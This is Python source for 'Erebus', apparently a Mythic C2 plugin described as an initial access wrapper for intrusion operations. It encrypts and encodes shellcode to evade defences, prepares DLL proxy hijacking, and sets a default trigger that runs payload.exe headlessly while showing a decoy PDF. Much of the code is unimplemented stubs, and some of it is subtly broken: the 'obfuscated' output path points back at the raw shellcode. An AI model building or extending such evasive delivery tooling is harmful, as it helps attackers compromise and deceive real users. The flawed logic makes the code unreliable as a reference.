'''
- Author: Lavender-exe // Whispergate
- Title: Erebus
- Description: Initial Access Wrapper

TODO:
- Containers
    - MSI/X Payload Containers
        -   https://github.com/TrevorHamm/msilib (Only supports python13)
    - 7zip/Winzip Containers
        -   https://pypi.org/project/py7zr/

'''
from erebus_wrapper.erebus.modules.payload_dll import generate_proxies
from erebus_wrapper.erebus.modules.payload_obfuscate_shellcode import ENCRYPTION, COMPRESSION, ENCODING, SHELLCRYPT, SHELLCODE_DIR
from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
from erebus_wrapper.erebus.modules.container_msi import build_msi

from mythic_container.PayloadBuilder import PayloadType, BuildParameter, BuildParameterType, BuildResponse, BuildStatus, BuildStep, AgentType
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import SendMythicRPCPayloadUpdatebuildStep, MythicRPCPayloadUpdateBuildStepMessage, SendMythicRPCFileGetContent, MythicRPCFileGetContentMessage

from pathlib import PurePath
from distutils.dir_util import copy_tree
from jinja2 import Environment, FileSystemLoader
from enum import Enum
import os
import asyncio
import tempfile


class ENCRYPTION_METHODS(Enum):
    AES128_CBC  = "aes_128"
    AES256_CBC  = "aes_cbc"
    AES256_ECB  = "aes_ecb"
    CHACHA20    = "chacha20"
    RC4         = "rc4"
    SALSA20     = "salsa20"
    XOR         = "xor"
    XOR_COMPLEX = "xor_complex"


class ENCODING_METHODS(Enum):
    ALPHA32  = "alpha32"
    ASCII85  = "ascii85"
    BASE64   = "base64"
    WORDS256 = "words256"
    NONE     = "None"


class COMPRESSION_METHODS(Enum):
    LZNT1 = "lznt"
    RLE   = "rle"
    NONE     = "None"


class SHELLCODE_FORMAT(Enum):
    C          = "c"
    CSharp     = "csharp"
    Nim        = "nim"
    Go         = "go"
    Python     = "py"
    Powershell = "ps1"
    VBA        = "vba"
    VBScript   = "vbscript"
    Rust       = "rust"
    JavaScript = "js"
    Zig        = "zig"
    Raw        = "raw"


FINAL_PAYLOAD_EXTENSIONS = [
    "exe",
    "dll",
    "7z",
    "zip",
    "tar",
    "tar.gz",
    "bin",
]


class ErebusWrapper(PayloadType):
    name = "erebus_wrapper"
    file_extension = "7z"
    author = "@Lavender-exe"
    note = """Erebus is a modern initial access wrapper aimed at decreasing the development to deployment time, when preparing for intrusion operations.
Erebus comes with multiple techniques out of the box to craft complex chains, and assist in bypassing the toughest security measures."""
    supported_os = [
        SupportedOS.Windows
        # SupportedOS.Linux, Not Supported Yet
    ]

    wrapper = True
    wrapped_payloads = []

    supports_dynamic_loading = False
    c2_profiles = []

    agent_type = AgentType.Wrapper
    agent_path = PurePath(".") / "erebus_wrapper"
    agent_icon_path = agent_path / "Erebus.svg"
    agent_code_path = agent_path / "agent_code"

    environment = Environment(loader=FileSystemLoader("agent_code/templates/"))

    build_parameters = [
        BuildParameter(
            name = "Architecture",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select Architecture.",
            choices = ["Any_CPU", "x64", "x86"],
            default_value = "x64",
            required=True
        ),

        BuildParameter(
            name = "DLL Hijacking",
            parameter_type = BuildParameterType.File,
            description = "Prepares a given DLL for proxy-based hijacking.",
        ),

        BuildParameter(
            name = "DLL Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose whether the DLL is .NET or C++.",
            choices=[".NET", "C++"]
        ),

        BuildParameter(
            name = "Trigger Command",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "C:\\Windows\\System32\\conhost.exe --headless cmd.exe /Q /c payload.exe | decoy.pdf"
        ),

        BuildParameter(
            name = "Decoy File",
            parameter_type = BuildParameterType.File,
            description = """Upload a decoy file (PDF/XLSX/etc.).
            If one is not uploaded then an example file will be used.""",
        ),

        # Shellcrypt
        BuildParameter(
            name = "Compression Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a compression type for the shellcode.",
            choices = COMPRESSION_METHODS._member_names_,
            default_value="NONE"
        ),

        BuildParameter(
            name = "Encryption Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encryption type for the shellcode.",
            choices = ENCRYPTION_METHODS._member_names_,
        ),

        BuildParameter(
            name = "Encryption Key",
            parameter_type = BuildParameterType.String,
            description = """Choose an encryption key. A random one will be
            generated if none have been entered.""",
        ),

        BuildParameter(
            name = "Encoding Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encoding type for the shellcode.",
            choices = ENCODING_METHODS._member_names_,
            default_value="NONE"
        ),

        BuildParameter(
            name = "Shellcode Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Choose a format for the final shellcode.""",
            choices = SHELLCODE_FORMAT._member_names_,
        ),

        # ProtectMyTooling
        # BuildParameter(

        # ),

        # LNK
        # BuildParameter(

        # ),

        # PackMyPayload
        # BuildParameter(

        # ),
    ]

    build_steps = [
        BuildStep(step_name = "Gathering Files",
                  step_description = "Copy files to temporary location"),

        BuildStep(step_name = "Header Check",
                  step_description = "Check file for MZ Header"),

        BuildStep(step_name = "Shellcode Obfuscation",
                  step_description = "Obfuscating shellcode based on selected options"),

        BuildStep(step_name = "Gathering DLL Exports for Hijacking",
                  step_description = """Extracts exports from the uploaded DLL
                  to be used for sideloading/proxying"""),

        BuildStep(step_name = "Adding Trigger",
                  step_description = "Creating trigger to execute given payload"),

        BuildStep(step_name = "Creating Decoy",
                  step_description= "Creating a placeholder decoy file"),

        BuildStep(step_name = "Containerising",
                  step_description = "Adding payload into chosen container"),
    ]

    async def prepare_dllproxy(self, dll_type: str, dll_target, shellcode):
        """Prepares a DLL File for proxy'd hijacking

        Args:
            dll_type (str): _description_
            dll_target (str): _description_
            shellcode (bytearray): _description_

        Raises:
            NotImplementedError: _description_
        """

        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=dll_target
        ))

        if not file_content.Success:
            raise Exception(f"[-] Failed to get file content: {file_content.Error}")

        template = self.environment.get_template("dll_template.cpp")

        pragmas = generate_proxies(file_content.Content)

        dll_pragmas = {"PRAGMAS": pragmas}
        file_content = template.render(**dll_pragmas)

        with open(f"{self.agent_path}/agent_code/templates/dll_template.cpp", "w") as file:
            file.write(file_content)

    async def generate_payload(self):
        """Creates a payload based on the provided shellcode/agent

        Raises:
            NotImplementedError: Function not implemented yet.

        TODO:
            - Take in payload.
            - Check that it is in shellcode format (File Header Check).
            - Add different techniques to build payload:
                - AppDomain Injection (Local and Remote)
                - ClickOnce (Local and Remote)
                - MSI + MST
                - MSIX (Unsigned and Signed)
        """
        raise NotImplementedError

    async def create_triggers(self):
        """Creates a trigger to execute the payload

        Raises:
            NotImplementedError: Function not implemented yet.

        TODO:
            - LNK Trigger
            - LOLBIN Trigger
            - MSI/MST Trigger
            - ClickOnce Trigger
        """
        raise NotImplementedError

    async def containerise_payload(self):
        """Creates a container and adds all files generated from the payload function inside of the given archive/media

        Raises:
            NotImplementedError: Function not implemented yet.

        TODO:
            - 7z Compression
            - ZIP Compression
            - ISO Container
        """
        raise NotImplementedError

    async def build(self) -> BuildResponse:
        response = BuildResponse(status = BuildStatus.Error)
        output = ""

        try:
            agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid)
            copy_tree(str(self.agent_code_path), agent_build_path.name)

            mythic_shellcode_path = PurePath(agent_build_path.name) / "agent_code/shellcode/payload.bin"
            mythic_shellcode_path = str(mythic_shellcode_path)
            
            obfuscated_shellcode_path = PurePath(agent_build_path.name) / "agent_code/shellcode/obfuscated.bin"
            obfuscated_shellcode_path = str(mythic_shellcode_path)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName = "Gathering Files",
                StepStdout = "Gathered files to obfuscate shellcode",
                StepSuccess = True
            ))

            with open(mythic_shellcode_path, "wb") as file:
                file.write(self.wrapped_payload)
                response.status = BuildStatus.Success
                response.build_message = "Files Gathered for Conversion."

            with open(str(mythic_shellcode_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":
                    response.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Header Check",
                        StepStdout="Found leading MZ header - supplied file wasn't shellcode",
                        StepSuccess=True
                    ))
                    return response
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Header Check",
                StepStdout="No leading MZ header for payload",
                StepSuccess=True
            ))
            response.status = BuildStatus.Success
            response.build_message = "No leading MZ header for payload."

            # obfuscated = self.obfuscate_shellcode(
            #     encryption=ENCRYPTION_METHODS._member_map_[self.build_parameters("Encryption Type")].value,
            #     encryption_key=self.build_parameters("Encryption Key"),
            #     encoding=ENCODING_METHODS._member_map_[self.build_parameters("Encoding Type")].value,
            #     compression=COMPRESSION_METHODS._member_map_[self.build_parameters("Compression Type")].value,
            #     shellcode=mythic_shellcode_path,
            #     format=SHELLCODE_FORMAT._member_map_[self.build_parameters("Shellcode Format")].value)

            # asyncio.run(obfuscated)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Shellcode Obfuscation",
                StepStdout="Obfuscating Shellcode",
                StepSuccess=True,
            ))

            cmd = [
                "python3",
                str(SHELLCRYPT),
                "-i", mythic_shellcode_path,
                "-e", ENCRYPTION_METHODS._member_map_[self.build_parameters("Encryption Type")].value,
                "-f", SHELLCODE_FORMAT._member_map_[self.build_parameters("Shellcode Format")].value,
                "-a", "shellcode"
            ]
            if self.build_parameters("Compression Type") != "NONE":
                cmd += ["-c", COMPRESSION_METHODS._member_map_[self.build_parameters("Compression Type")].value]

            if self.build_parameters("Encoding Type") != "NONE":
                cmd += ["-d", ENCODING_METHODS._member_map_[self.build_parameters("Encoding Type")].value]

            # key handling
            if self.build_parameters("Encryption Key"):
                cmd += ["-k", self.build_parameters("Encryption Key")]
            else:
                cmd += ["-k", ""]

            cmd += ["-o", f"{SHELLCODE_DIR / 'obfuscated.bin'}"]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(obfuscated_shellcode_path):
                response.payload = open(obfuscated_shellcode_path, "rb").read()
                response.status = BuildStatus.Success
                response.build_message = "Shellcode Generated!"
                return response
            elif proc.returncode != 0:
                response.payload = b""
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path                
            else:
                response.payload = b""
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
        except Exception as e:
            raise RuntimeError(str(e) + "\n" + output) from e

        return response
